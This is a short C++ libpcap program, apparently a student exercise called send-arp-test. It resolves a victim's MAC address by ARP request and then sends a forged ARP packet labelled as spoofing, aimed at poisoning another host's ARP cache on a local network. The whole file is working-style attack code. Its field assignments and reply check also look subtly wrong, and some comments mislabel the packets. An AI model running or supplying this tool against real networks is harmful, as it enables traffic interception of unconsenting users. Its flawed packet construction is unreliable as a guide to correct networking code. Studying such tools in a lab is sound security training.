#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "string.h"
#include "unistd.h"
#include <sys/socket.h>
#include <net/if.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

Mac get_my_mac(const char* ifname) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return Mac("00:00:00:00:00:00");
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sockfd);
        return Mac("00:00:00:00:00:00");
    }

    close(sockfd);
    return Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
}

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char* sender_ipstr = argv[2];
	char* target_ipstr = argv[3];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	struct pcap_pkthdr* header;
    const u_char* reply_packet;
    Mac yejun_mac;


	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");	//broadcast
	packet.eth_.smac_ = Mac(get_my_mac(dev));		//mymac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac("00:00:00:00:00:00");	//goyejun
	packet.arp_.sip_ = htonl(Ip(sender_ipstr));		//goyejun
	packet.arp_.tmac_ = Mac(get_my_mac(dev));	//mymac
	packet.arp_.tip_ = htonl(Ip(target_ipstr));		//gateway

	// send ARP to get goyejun MAC
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	// wait for reply
	while (true) {
        int ret = pcap_next_ex(handle, &header, &reply_packet);
        if (ret == 1) {
            const EthArpPacket* recv_packet = reinterpret_cast<const EthArpPacket*>(reply_packet);

            // ARP Reply 확인
            if (ntohs(recv_packet->eth_.type_) == EthHdr::Arp &&
                ntohs(recv_packet->arp_.op_) == ArpHdr::Reply &&
                (recv_packet->arp_.sip_) == htonl(Ip(target_ipstr))) {
                yejun_mac = recv_packet->arp_.smac_;
                break;
            }
        } else if (ret == -1) {
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", ret, pcap_geterr(handle));
            pcap_close(handle);
            return -1;
        }
    }

	packet.eth_.dmac_ = yejun_mac;	//broadcast
	packet.eth_.smac_ = Mac(get_my_mac(dev));		//mymac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac("00:00:00:00:00:00");	//goyejun
	packet.arp_.sip_ = htonl(Ip(sender_ipstr));		//goyejun
	packet.arp_.tmac_ = Mac(get_my_mac(dev));		//mymac
	packet.arp_.tip_ = htonl(Ip(target_ipstr));		//gateway


	// send ARP for spoofing
	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
    return 0;





	pcap_close(handle);
}
